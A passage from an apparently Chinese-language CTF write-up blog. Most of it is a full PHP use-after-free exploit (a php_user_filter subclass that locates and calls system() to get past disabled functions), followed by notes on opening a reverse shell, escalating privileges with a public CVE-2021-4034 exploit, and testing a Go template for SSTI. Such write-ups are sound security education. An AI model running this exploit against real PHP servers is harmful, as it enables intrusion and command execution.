class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Helper</span> </span>&#123; <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$a</span>, <span class=\"hljs-variable\">$b</span>, <span class=\"hljs-variable\">$c</span>; &#125;</span><br><span class=\"php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Pwn</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">php_user_filter</span> </span>&#123;</span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$abc</span>, <span class=\"hljs-variable\">$abc_addr</span>;</span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$helper</span>, <span class=\"hljs-variable\">$helper_addr</span>, <span class=\"hljs-variable\">$helper_off</span>;</span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$uafp</span>, <span class=\"hljs-variable\">$hfp</span>;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filter</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$in</span>, <span class=\"hljs-variable\">$out</span>, &amp;<span class=\"hljs-variable\">$consumed</span>, <span class=\"hljs-variable\">$closing</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$closing</span>) <span class=\"hljs-keyword\">return</span>;</span><br><span class=\"php\">        stream_bucket_make_writeable(<span class=\"hljs-variable\">$in</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;filtername = Pwn::alloc(STRING_SIZE);</span><br><span class=\"php\">        fclose(<span class=\"hljs-keyword\">$this</span>-&gt;stream);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;go();</span><br><span class=\"php\">        <span class=\"hljs-keyword\">return</span> PSFS_PASS_ON;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">go</span>(<span class=\"hljs-params\"></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;abc = &amp;<span class=\"hljs-keyword\">$this</span>-&gt;filtername;</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;make_uaf_obj();</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;helper = <span class=\"hljs-keyword\">new</span> Helper;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;helper-&gt;b = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$x</span></span>) </span>&#123;&#125;;</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;helper_addr = <span class=\"hljs-keyword\">$this</span>-&gt;str2ptr(CHUNK_SIZE * <span class=\"hljs-number\">2</span> - <span class=\"hljs-number\">0x18</span>) - CHUNK_SIZE * <span class=\"hljs-number\">2</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;helper @ 0x%x&quot;</span>, <span class=\"hljs-keyword\">$this</span>-&gt;helper_addr);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;abc_addr = <span class=\"hljs-keyword\">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;abc @ 0x%x&quot;</span>, <span class=\"hljs-keyword\">$this</span>-&gt;abc_addr);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;helper_off = <span class=\"hljs-keyword\">$this</span>-&gt;helper_addr - <span class=\"hljs-keyword\">$this</span>-&gt;abc_addr - <span class=\"hljs-number\">0x18</span>;</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$helper_handlers</span> = <span class=\"hljs-keyword\">$this</span>-&gt;str2ptr(CHUNK_SIZE);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;helper handlers @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$helper_handlers</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;prepare_leaker();</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$binary_leak</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$helper_handlers</span> + <span class=\"hljs-number\">8</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;binary leak @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$binary_leak</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;prepare_cleanup(<span class=\"hljs-variable\">$binary_leak</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$closure_addr</span> = <span class=\"hljs-keyword\">$this</span>-&gt;str2ptr(<span class=\"hljs-keyword\">$this</span>-&gt;helper_off + <span class=\"hljs-number\">0x38</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;real closure @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$closure_addr</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$closure_ce</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$closure_addr</span> + <span class=\"hljs-number\">0x10</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;closure class_entry @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$closure_ce</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$basic_funcs</span> = <span class=\"hljs-keyword\">$this</span>-&gt;get_basic_funcs(<span class=\"hljs-variable\">$closure_ce</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;basic_functions @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$basic_funcs</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$zif_system</span> = <span class=\"hljs-keyword\">$this</span>-&gt;get_system(<span class=\"hljs-variable\">$basic_funcs</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;zif_system @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$zif_system</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$fake_closure_off</span> = <span class=\"hljs-keyword\">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class=\"hljs-number\">2</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-number\">0x138</span>; <span class=\"hljs-variable\">$i</span> += <span class=\"hljs-number\">8</span>) &#123;</span><br><span class=\"php\">            <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$fake_closure_off</span> + <span class=\"hljs-variable\">$i</span>, <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$closure_addr</span> + <span class=\"hljs-variable\">$i</span>));</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$fake_closure_off</span> + <span class=\"hljs-number\">0x38</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">4</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$handler_offset</span> = PHP_MAJOR_VERSION === <span class=\"hljs-number\">8</span> ? <span class=\"hljs-number\">0x70</span> : <span class=\"hljs-number\">0x68</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$fake_closure_off</span> + <span class=\"hljs-variable\">$handler_offset</span>, <span class=\"hljs-variable\">$zif_system</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$fake_closure_addr</span> = <span class=\"hljs-keyword\">$this</span>-&gt;helper_addr + <span class=\"hljs-variable\">$fake_closure_off</span> - <span class=\"hljs-keyword\">$this</span>-&gt;helper_off;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-keyword\">$this</span>-&gt;helper_off + <span class=\"hljs-number\">0x38</span>, <span class=\"hljs-variable\">$fake_closure_addr</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;fake closure @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$fake_closure_addr</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;cleanup();</span><br><span class=\"php\">        (<span class=\"hljs-keyword\">$this</span>-&gt;helper-&gt;b)(CMD);</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">make_uaf_obj</span>(<span class=\"hljs-params\"></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;uafp = fopen(<span class=\"hljs-string\">&#x27;php://memory&#x27;</span>, <span class=\"hljs-string\">&#x27;w&#x27;</span>);</span><br><span class=\"php\">        fputs(<span class=\"hljs-keyword\">$this</span>-&gt;uafp, pack(<span class=\"hljs-string\">&#x27;QQQ&#x27;</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0xDEADBAADC0DE</span>));</span><br><span class=\"php\">        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; STRING_SIZE; <span class=\"hljs-variable\">$i</span>++) &#123;</span><br><span class=\"php\">            fputs(<span class=\"hljs-keyword\">$this</span>-&gt;uafp, <span class=\"hljs-string\">&quot;\\x00&quot;</span>);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">prepare_leaker</span>(<span class=\"hljs-params\"></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-variable\">$str_off</span> = <span class=\"hljs-keyword\">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class=\"hljs-number\">8</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$str_off</span>, <span class=\"hljs-number\">2</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$str_off</span> + <span class=\"hljs-number\">0x10</span>, <span class=\"hljs-number\">6</span>);</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-variable\">$val_off</span> = <span class=\"hljs-keyword\">$this</span>-&gt;helper_off + <span class=\"hljs-number\">0x48</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$val_off</span>, <span class=\"hljs-keyword\">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class=\"hljs-number\">8</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-variable\">$val_off</span> + <span class=\"hljs-number\">8</span>, <span class=\"hljs-number\">0xA</span>);</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">prepare_cleanup</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$binary_leak</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-variable\">$ret_gadget</span> = <span class=\"hljs-variable\">$binary_leak</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">do</span> &#123;</span><br><span class=\"php\">            --<span class=\"hljs-variable\">$ret_gadget</span>;</span><br><span class=\"php\">        &#125; <span class=\"hljs-keyword\">while</span>(<span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$ret_gadget</span>, <span class=\"hljs-number\">1</span>) !== <span class=\"hljs-number\">0xC3</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;ret gadget = 0x%x&quot;</span>, <span class=\"hljs-variable\">$ret_gadget</span>);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-number\">0</span>, <span class=\"hljs-keyword\">$this</span>-&gt;abc_addr + <span class=\"hljs-number\">0x20</span> - (PHP_MAJOR_VERSION === <span class=\"hljs-number\">8</span> ? <span class=\"hljs-number\">0x50</span> : <span class=\"hljs-number\">0x60</span>));</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-number\">8</span>, <span class=\"hljs-variable\">$ret_gadget</span>);</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$addr</span>, <span class=\"hljs-variable\">$n</span> = <span class=\"hljs-number\">8</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;write(<span class=\"hljs-keyword\">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class=\"hljs-number\">16</span>, <span class=\"hljs-variable\">$addr</span> - <span class=\"hljs-number\">0x10</span>);</span><br><span class=\"php\">        <span class=\"hljs-variable\">$value</span> = strlen(<span class=\"hljs-keyword\">$this</span>-&gt;helper-&gt;c);</span><br><span class=\"php\">        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$n</span> !== <span class=\"hljs-number\">8</span>) &#123; <span class=\"hljs-variable\">$value</span> &amp;= (<span class=\"hljs-number\">1</span> &lt;&lt; (<span class=\"hljs-variable\">$n</span> &lt;&lt; <span class=\"hljs-number\">3</span>)) - <span class=\"hljs-number\">1</span>; &#125;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$value</span>;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$p</span>, <span class=\"hljs-variable\">$v</span>, <span class=\"hljs-variable\">$n</span> = <span class=\"hljs-number\">8</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-variable\">$n</span>; <span class=\"hljs-variable\">$i</span>++) &#123;</span><br><span class=\"php\">            <span class=\"hljs-keyword\">$this</span>-&gt;abc[<span class=\"hljs-variable\">$p</span> + <span class=\"hljs-variable\">$i</span>] = chr(<span class=\"hljs-variable\">$v</span> &amp; <span class=\"hljs-number\">0xff</span>);</span><br><span class=\"php\">            <span class=\"hljs-variable\">$v</span> &gt;&gt;= <span class=\"hljs-number\">8</span>;</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get_basic_funcs</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$addr</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">while</span>(<span class=\"hljs-literal\">true</span>) &#123;</span><br><span class=\"php\">            <span class=\"hljs-comment\">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span><br><span class=\"php\">            <span class=\"hljs-comment\">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span><br><span class=\"php\">            <span class=\"hljs-comment\">// In that case, changing the direction of the search should fix the crash.</span></span><br><span class=\"php\">            <span class=\"hljs-comment\">// $addr += 0x10;</span></span><br><span class=\"php\">            <span class=\"hljs-variable\">$addr</span> -= <span class=\"hljs-number\">0x10</span>;</span><br><span class=\"php\">            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$addr</span>, <span class=\"hljs-number\">4</span>) === <span class=\"hljs-number\">0xA8</span> &amp;&amp;</span><br><span class=\"php\">                in_array(<span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$addr</span> + <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">4</span>),</span><br><span class=\"php\">                    [<span class=\"hljs-number\">20151012</span>, <span class=\"hljs-number\">20160303</span>, <span class=\"hljs-number\">20170718</span>, <span class=\"hljs-number\">20180731</span>, <span class=\"hljs-number\">20190902</span>, <span class=\"hljs-number\">20200930</span>])) &#123;</span><br><span class=\"php\">                <span class=\"hljs-variable\">$module_name_addr</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$addr</span> + <span class=\"hljs-number\">0x20</span>);</span><br><span class=\"php\">                <span class=\"hljs-variable\">$module_name</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$module_name_addr</span>);</span><br><span class=\"php\">                <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$module_name</span> === <span class=\"hljs-number\">0x647261646e617473</span>) &#123;</span><br><span class=\"php\">                    <span class=\"hljs-keyword\">$this</span>-&gt;log(<span class=\"hljs-string\">&quot;standard module @ 0x%x&quot;</span>, <span class=\"hljs-variable\">$addr</span>);</span><br><span class=\"php\">                    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$addr</span> + <span class=\"hljs-number\">0x28</span>);</span><br><span class=\"php\">                &#125;</span><br><span class=\"php\">            &#125;</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get_system</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$basic_funcs</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-variable\">$addr</span> = <span class=\"hljs-variable\">$basic_funcs</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">do</span> &#123;</span><br><span class=\"php\">            <span class=\"hljs-variable\">$f_entry</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$addr</span>);</span><br><span class=\"php\">            <span class=\"hljs-variable\">$f_name</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$f_entry</span>, <span class=\"hljs-number\">6</span>);</span><br><span class=\"php\">            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$f_name</span> === <span class=\"hljs-number\">0x6d6574737973</span>) &#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">$this</span>-&gt;read(<span class=\"hljs-variable\">$addr</span> + <span class=\"hljs-number\">8</span>);</span><br><span class=\"php\">            &#125;</span><br><span class=\"php\">            <span class=\"hljs-variable\">$addr</span> += <span class=\"hljs-number\">0x20</span>;</span><br><span class=\"php\">        &#125; <span class=\"hljs-keyword\">while</span>(<span class=\"hljs-variable\">$f_entry</span> !== <span class=\"hljs-number\">0</span>);</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">cleanup</span>(<span class=\"hljs-params\"></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">$this</span>-&gt;hfp = fopen(<span class=\"hljs-string\">&#x27;php://memory&#x27;</span>, <span class=\"hljs-string\">&#x27;w&#x27;</span>);</span><br><span class=\"php\">        fputs(<span class=\"hljs-keyword\">$this</span>-&gt;hfp, pack(<span class=\"hljs-string\">&#x27;QQ&#x27;</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-keyword\">$this</span>-&gt;abc_addr));</span><br><span class=\"php\">        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; FILTER_SIZE - <span class=\"hljs-number\">0x10</span>; <span class=\"hljs-variable\">$i</span>++) &#123;</span><br><span class=\"php\">            fputs(<span class=\"hljs-keyword\">$this</span>-&gt;hfp, <span class=\"hljs-string\">&quot;\\x00&quot;</span>);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">str2ptr</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$p</span> = <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$n</span> = <span class=\"hljs-number\">8</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-variable\">$address</span> = <span class=\"hljs-number\">0</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$j</span> = <span class=\"hljs-variable\">$n</span> - <span class=\"hljs-number\">1</span>; <span class=\"hljs-variable\">$j</span> &gt;= <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$j</span>--) &#123;</span><br><span class=\"php\">            <span class=\"hljs-variable\">$address</span> &lt;&lt;= <span class=\"hljs-number\">8</span>;</span><br><span class=\"php\">            <span class=\"hljs-variable\">$address</span> |= ord(<span class=\"hljs-keyword\">$this</span>-&gt;abc[<span class=\"hljs-variable\">$p</span> + <span class=\"hljs-variable\">$j</span>]);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$address</span>;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">ptr2str</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ptr</span>, <span class=\"hljs-variable\">$n</span> = <span class=\"hljs-number\">8</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-variable\">$out</span> = <span class=\"hljs-string\">&#x27;&#x27;</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-variable\">$n</span>; <span class=\"hljs-variable\">$i</span>++) &#123;</span><br><span class=\"php\">            <span class=\"hljs-variable\">$out</span> .= chr(<span class=\"hljs-variable\">$ptr</span> &amp; <span class=\"hljs-number\">0xff</span>);</span><br><span class=\"php\">            <span class=\"hljs-variable\">$ptr</span> &gt;&gt;= <span class=\"hljs-number\">8</span>;</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$out</span>;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">log</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$format</span>, <span class=\"hljs-variable\">$val</span> = <span class=\"hljs-string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">if</span>(LOGGING) &#123;</span><br><span class=\"php\">            printf(<span class=\"hljs-string\">&quot;<span class=\"hljs-subst\">&#123;$format&#125;</span>\\n&quot;</span>, <span class=\"hljs-variable\">$val</span>);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">    <span class=\"hljs-built_in\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">alloc</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$size</span></span>) </span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">return</span> str_shuffle(str_repeat(<span class=\"hljs-string\">&#x27;A&#x27;</span>, <span class=\"hljs-variable\">$size</span>));</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\">&#125;</span><br><span class=\"php\">------WebKitFormBoundaryj28zfvoWVxnHdp29--</span><br><span class=\"php\"></span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105915.png\" alt=\"image-20220212170045711\" class=\"lazyload\"></p>\n<p>权限不够拿 flag，反弹 shell，用 https://github.com/arthepsy/CVE-2021-4034 提权，然后拿 flag</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105567.png\" alt=\"image-20220212170553826\" class=\"lazyload\"></p>\n<h3 id=\"gocalc0\"><a class=\"markdownIt-Anchor\" href=\"#gocalc0\">#</a> gocalc0</h3>\n<p>测试 <code>&#123;&#123;.&#125;&#125;</code>  存在 SSTI，拿到源码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105844.png\" alt=\"image-20220212170806474\" class=\"lazyload\"></p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span 